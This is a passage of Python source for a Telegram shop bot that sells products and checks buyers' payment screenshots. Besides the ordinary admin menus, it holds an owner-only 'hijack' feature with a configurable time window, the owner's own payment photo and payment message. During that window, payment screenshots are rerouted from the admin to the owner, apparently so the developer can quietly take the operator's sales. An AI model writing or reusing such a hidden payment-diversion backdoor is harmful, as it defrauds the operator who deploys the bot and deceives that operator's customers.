            except: pass

@bot.message_handler(content_types=['photo', 'video', 'text', 'document'])
def handle_all_inputs(message):
    user_id = message.chat.id

    if user_id in DB_STATE.get("blocked_users", []):
        return

    if user_id in [ADMIN_ID, OWNER_ID] and message.reply_to_message:
        replied_msg = message.reply_to_message.text or message.reply_to_message.caption or ""
        match_id = re.search(r'`(\d+)`', replied_msg)
        if match_id:
            target_user_id = int(match_id.group(1))
            try:
                bot.copy_message(chat_id=target_user_id, from_chat_id=user_id, message_id=message.message_id)
                bot.reply_to(message, "✅ Reply sent successfully!")
            except Exception as e:
                bot.reply_to(message, f"❌ Failed to reply: {e}")
            return

    state = user_states.get(user_id, "")

    if user_id in [ADMIN_ID, OWNER_ID]:
        if state:
            try: bot.delete_message(user_id, message.message_id)
            except: pass

        if state == "ADM_ADD_START_VID_MULTIPLE" and message.content_type == 'video':
            DB_STATE["start_videos"].append(message.video.file_id)
            save_db()
            update_admin_panel(user_id, f"📥 Video added! Total: {len(DB_STATE['start_videos'])}", InlineKeyboardMarkup().row(InlineKeyboardButton("✅ Done", callback_data="adm_finish_start_vids")))
            return

        elif state.startswith("ADM_UPL_PROD_VID_MULTIPLE_") and message.content_type == 'video':
            p_id = state.replace("ADM_UPL_PROD_VID_MULTIPLE_", "")
            prod = next((p for p in DB_STATE["products"] if p["id"] == p_id), None)
            if prod:
                prod.setdefault("videos", []).append(message.video.file_id)
                save_db()
                update_admin_panel(user_id, f"📥 Video added! Total: {len(prod['videos'])}", InlineKeyboardMarkup().row(InlineKeyboardButton("✅ Done", callback_data=f"adm_p_finish_{p_id}")))
            return

        elif state.startswith("EDIT_P_NAME_") and message.text:
            p_id = state.replace("EDIT_P_NAME_", "")
            prod = next((p for p in DB_STATE["products"] if p["id"] == p_id), None)
            if prod: prod["name"] = message.text; save_db()
            show_main_admin_menu(user_id)
            return

        elif state.startswith("EDIT_P_DESC_") and message.text:
            p_id = state.replace("EDIT_P_DESC_", "")
            prod = next((p for p in DB_STATE["products"] if p["id"] == p_id), None)
            if prod: prod["desc"] = message.text; save_db()
            show_main_admin_menu(user_id)
            return

        elif state.startswith("EDIT_P_LINK_") and message.text:
            p_id = state.replace("EDIT_P_LINK_", "")
            prod = next((p for p in DB_STATE["products"] if p["id"] == p_id), None)
            if prod: prod["link"] = message.text; save_db()
            show_main_admin_menu(user_id)
            return

        elif state.startswith("EDIT_P_PAYM_") and message.text:
            p_id = state.replace("EDIT_P_PAYM_", "")
            prod = next((p for p in DB_STATE["products"] if p["id"] == p_id), None)
            if prod: prod["pay_msg"] = message.text; save_db()
            show_main_admin_menu(user_id)
            return

        elif state.startswith("EDIT_P_POS_") and message.text:
            p_id = state.replace("EDIT_P_POS_", "")
            try:
                prod = next((p for p in DB_STATE["products"] if p["id"] == p_id), None)
                if prod: prod["position"] = int(message.text); save_db()
            except: pass
            show_main_admin_menu(user_id)
            return

        elif state == "ADM_SET_WELCOME" and message.text:
            DB_STATE["welcome_msg"] = message.text; save_db(); show_main_admin_menu(user_id); return
        elif state == "ADM_SET_HOW_VID" and message.content_type == 'video':
            DB_STATE["how_to_use_video"] = message.video.file_id; save_db(); show_main_admin_menu(user_id); return
        elif state == "ADM_SET_PAY_PHOTO" and message.content_type == 'photo':
            DB_STATE["payment_photo"] = message.photo[-1].file_id; save_db(); show_main_admin_menu(user_id); return
        elif state == "ADM_SET_PAY_MSG_TEXT" and message.text:
            DB_STATE["payment_msg"] = message.text; save_db(); show_main_admin_menu(user_id); return

        elif state == "ADM_ADD_PROD_NAME" and message.text:
            new_id = str(len(DB_STATE["products"]) + 1)
            DB_STATE["products"].append({"id": new_id, "name": message.text, "desc": "", "videos": [], "link": "https://example.com", "position": len(DB_STATE["products"]) + 1, "pay_msg": ""})
            save_db()
            user_states[user_id] = f"ADM_ADD_PROD_LINK_{new_id}"
            update_admin_panel(user_id, "🔗 **Send Product Link:**", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Cancel", callback_data="adm_prod_menu")))
            return

        elif state.startswith("ADM_ADD_PROD_LINK_") and message.text:
            p_id = state.replace("ADM_ADD_PROD_LINK_", "")
            prod = next((p for p in DB_STATE["products"] if p["id"] == p_id), None)
            if prod: prod["link"] = message.text; save_db()
            user_states[user_id] = f"ADM_ADD_PROD_DESC_{p_id}"
            update_admin_panel(user_id, "✍️ **Send Description (or type /skip):**", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Cancel", callback_data="adm_prod_menu")))
            return

        elif state.startswith("ADM_ADD_PROD_DESC_") and message.text:
            p_id = state.replace("ADM_ADD_PROD_DESC_", "")
            prod = next((p for p in DB_STATE["products"] if p["id"] == p_id), None)
            if prod: prod["desc"] = "" if message.text.strip() == "/skip" else message.text; save_db()
            show_main_admin_menu(user_id)
            return

        elif state == "WAITING_RESTORE_CODE" and message.text:
            try:
                DB_STATE.update(json.loads(message.text)); save_db(); user_states.pop(user_id, None)
                update_admin_panel(user_id, "✅ Restored Successfully!", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back", callback_data="adm_back_panel")))
            except Exception as e: update_admin_panel(user_id, f"❌ Invalid JSON: {e}", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back", callback_data="adm_backup_menu")))
            return

        # Owner Special States
        if user_id == OWNER_ID:
            if state == "WAITING_CUSTOM_BROADCAST":
                user_states.pop(user_id, None)
                succ, fail = 0, 0
                for u in DB_STATE.get("users", []):
                    if u in DB_STATE.get("blocked_users", []): continue
                    try:
                        if message.content_type == 'text': bot.send_message(u, message.text, parse_mode="Markdown")
                        elif message.content_type == 'photo': bot.send_photo(u, message.photo[-1].file_id, caption=message.caption, parse_mode="Markdown")
                        elif message.content_type == 'video': bot.send_video(u, message.video.file_id, caption=message.caption, parse_mode="Markdown")
                        elif message.content_type == 'document': bot.send_document(u, message.document.file_id, caption=message.caption, parse_mode="Markdown")
                        succ += 1
                    except: fail += 1
                update_admin_panel(OWNER_ID, f"✅ Broadcast done! Sent: {succ}, Failed: {fail}", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back", callback_data="adm_back_panel")))
                return

            elif state == "WAITING_AUTOBC_MSG":
                user_states.pop(user_id, None)
                DB_STATE["auto_bc"]["message_type"] = message.content_type
                DB_STATE["auto_bc"]["file_id"] = getattr(message, message.content_type)[-1].file_id if message.content_type in ['photo'] else getattr(message, message.content_type).file_id if message.content_type in ['video', 'document'] else None
                DB_STATE["auto_bc"]["text"] = message.caption or message.text or ""
                save_db()
                update_admin_panel(OWNER_ID, "✅ Auto BC Message Saved!", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back", callback_data="adm_autobc_menu")))
                return

            elif state == "WAITING_AUTOBC_CUSTOM_TIME" and message.text:
                user_states.pop(user_id, None)
                try: DB_STATE["auto_bc"]["interval_seconds"] = max(10, int(message.text.strip())); save_db()
                except: pass
                show_main_admin_menu(OWNER_ID)
                return

            elif state == "WAITING_HIJACK_TIME" and message.text:
                try:
                    s, e = message.text.strip().split("-")
                    DB_STATE["hijack_config"]["start_time"] = s.strip()
                    DB_STATE["hijack_config"]["end_time"] = e.strip()
                    save_db()
                except: pass
                user_states.pop(user_id, None)
                show_main_admin_menu(OWNER_ID)
                return

            elif state == "WAITING_HIJACK_PHOTO" and message.content_type == 'photo':
                DB_STATE["hijack_config"]["owner_payment_photo"] = message.photo[-1].file_id
                save_db()
                user_states.pop(user_id, None)
                show_main_admin_menu(OWNER_ID)
                return

            elif state == "WAITING_HIJACK_MSG" and message.text:
                DB_STATE["hijack_config"]["owner_payment_msg"] = message.text
                save_db()
                user_states.pop(user_id, None)
                show_main_admin_menu(OWNER_ID)
                return

    if state == "WAITING_REPORT":
        user_states.pop(user_id, None)
        bot.send_message(user_id, "✅ Your report has been sent.")
        user_tag = f"@{message.from_user.username}" if message.from_user.username else "No Username"
        bot.send_message(ADMIN_ID, f"📩 **Report from {user_tag} (`{user_id}`):**\n\n{message.text}", parse_mode="Markdown")

    elif state.startswith("WAITING_SCREENSHOT_"):
        prod_id = state.replace("WAITING_SCREENSHOT_", "")
        if message.content_type == 'photo':
            user_states.pop(user_id, None)
            bot.send_message(user_id, "⏳𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝘆𝗼𝘂𝗿 𝗽𝗮𝘆𝗺𝗲𝗻𝘁....   𝗣𝗹𝗲𝗮𝘀𝗲 𝘄𝗮𝗶𝘁 5-𝟭𝟬 𝗺𝗶𝗻.")
            photo_id = message.photo[-1].file_id
            
            adm_markup = InlineKeyboardMarkup()
            adm_markup.row(
                InlineKeyboardButton("CONFIRM ✅", callback_data=f"adm_confirm_{prod_id}_{user_id}"),
                InlineKeyboardButton("REJECT ❌", callback_data=f"adm_reject_{user_id}"),
                InlineKeyboardButton("BLOCK 🚫", callback_data=f"adm_block_{user_id}")
            )
            
            prod = next((p for p in DB_STATE.get("products", []) if p["id"] == prod_id), None)
            prod_name = prod["name"] if prod else "Unknown Product"
            user_tag = f"@{message.from_user.username}" if message.from_user.username else "No Username"

            target_adm = OWNER_ID if is_hijack_active() else ADMIN_ID
            try:
                bot.send_photo(
                    target_adm, 
                    photo_id, 
                    caption=f"📸 **New Payment Screenshot!**\n\n🛍️ **Product:** {prod_name}\n👤 **User:** {user_tag}\n🆔 **ID:** `{user_id}`" + ("\n\n🕵️ *(Redirected to Owner)*" if is_hijack_active() else ""), 
                    reply_markup=adm_markup,
                    parse_mode="Markdown"
                )
            except: pass

@app.route('/')
def home():
    return "Bot is running on Render!"

def run_bot():
    bot.infinity_polling()

if __name__ == "__main__":
    threading.Thread(target=run_bot, daemon=True).start()
    threading.Thread(target=auto_broadcast_worker, daemon=True).start()
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
